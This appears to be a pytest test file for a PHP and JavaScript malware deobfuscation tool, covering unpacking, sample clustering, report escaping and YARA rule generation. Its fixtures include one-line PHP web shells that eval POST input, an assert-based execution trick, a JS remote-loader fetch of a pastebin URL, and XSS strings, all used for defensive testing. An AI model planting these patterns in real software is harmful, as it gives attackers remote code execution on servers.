import html

from evilbox.classify import cluster_groups, cluster_similar
from evilbox.cli import main
from evilbox.encoders import detect_commercial_encoders
from evilbox.pipeline import deobfuscate
from evilbox.report import render_html
from evilbox.signature import extract_surface


def test_unresolved_folds_per_layer_and_exit_code(tmp_path, capsys):
    src = tmp_path / "packed.php"
    src.write_text("<?php eval(gzinflate($_POST['x']));\n", encoding="utf-8")
    result = deobfuscate(src.read_text(encoding="utf-8"), language="php", path=str(src))
    layers = {item.layer for item in result.unresolved_folds}
    assert "original" in layers
    assert any(item.kind in {"decoder", "dispatch"} for item in result.unresolved_folds)
    assert result.failed_folds is True
    assert main([str(src), "--lang", "php"]) == 1
    err = capsys.readouterr().err
    assert "unresolved" in err.lower() or "failed" in err.lower() or "gzinflate" in err.lower()


def test_ioncube_encoded_not_analyzable():
    src = "<?php if(!extension_loaded('ionCube Loader')) die('loader'); // ionCube Loader\nHR+cP\n"
    result = deobfuscate(src, language="php")
    assert result.encoded_not_analyzable
    assert any("ioncube" in item["name"] for item in result.encoded_not_analyzable)
    assert "encoded, not analyzable" in " ".join(result.warnings)
    assert "ioncube-encoded" in result.packer


def test_array_stored_function_name():
    inner = "echo 'arrfn';"
    import base64

    b64 = base64.b64encode(inner.encode()).decode()
    src = f"<?php $a = array('base64_decode'); eval($a[0]('{b64}'));"
    result = deobfuscate(src, language="php")
    assert "arrfn" in result.text


def test_keyed_array_function_name():
    import base64

    inner = "echo 'keyfn';"
    b64 = base64.b64encode(inner.encode()).decode()
    src = f"<?php $a = array('d' => 'base64_decode'); eval($a['d']('{b64}'));"
    result = deobfuscate(src, language="php")
    assert "keyfn" in result.text


def test_usort_assert_payload():
    src = "<?php usort(array('echo \"usorted\";'), 'assert');"
    result = deobfuscate(src, language="php")
    assert "usorted" in result.text


def test_sibling_file_payload(tmp_path):
    sample = tmp_path / "shell.php"
    payload = tmp_path / "key.txt"
    payload.write_text("sibling-secret", encoding="utf-8")
    sample.write_text("<?php $k = file_get_contents(__DIR__ . '/key.txt');", encoding="utf-8")
    result = deobfuscate(sample.read_text(encoding="utf-8"), language="php", path=str(sample))
    assert "sibling-secret" in result.text


def test_cluster_minhash_ignores_domain_and_key():
    a = deobfuscate('<?php $u = "http://evil.example/a"; eval($_POST["x"]);', language="php")
    b = deobfuscate('<?php $u = "http://other.example/b"; eval($_POST["x"]);', language="php")
    assert a.cluster_minhash
    assert cluster_similar(a.text, b.text)
    groups = cluster_groups([("a.php", a.text), ("b.php", b.text)])
    assert len(groups) == 1


def test_html_report_escapes_malware_strings():
    src = "<?php eval(base64_decode('<script>alert(1)</script>')); $xss = '<img src=x onerror=alert(1)>';"
    result = deobfuscate(src, language="php")
    from evilbox.report import build_report

    page = render_html(build_report(result=result, path="xss.php"))
    assert "<script>alert(1)</script>" not in page
    assert "&lt;script&gt;" in page or "alert(1)" in html.escape(src)
    assert "<img src=x onerror=alert(1)>" not in page


def test_remote_loader_is_unresolved_stage():
    src = 'fetch("https://pastebin.com/raw/abc123");'
    result = deobfuscate(src, language="js")
    assert any(item.kind == "remote-loader" for item in result.unresolved_folds)


def test_php_substr_legacy_false():
    src = "<?php $x = substr('ab', 5);"
    eight = deobfuscate(src, language="php", php_version="8.3")
    seven = deobfuscate(src, language="php", php_version="7.4")
    assert "false" in seven.text
    assert "false" not in eight.text.lower() or "''" in eight.text


def test_surface_emits_full_yara_and_pcre():
    src = "<?php eval(base64_decode('ZWNobyAxOw==')); $campaign_tok_zz = 1;"
    surface = extract_surface(src, language="php")
    assert surface.yara_rule.startswith("rule ")
    assert "$s0" in surface.yara_rule
    assert "condition:" in surface.yara_rule
    assert any(item.pcre for item in surface.items)
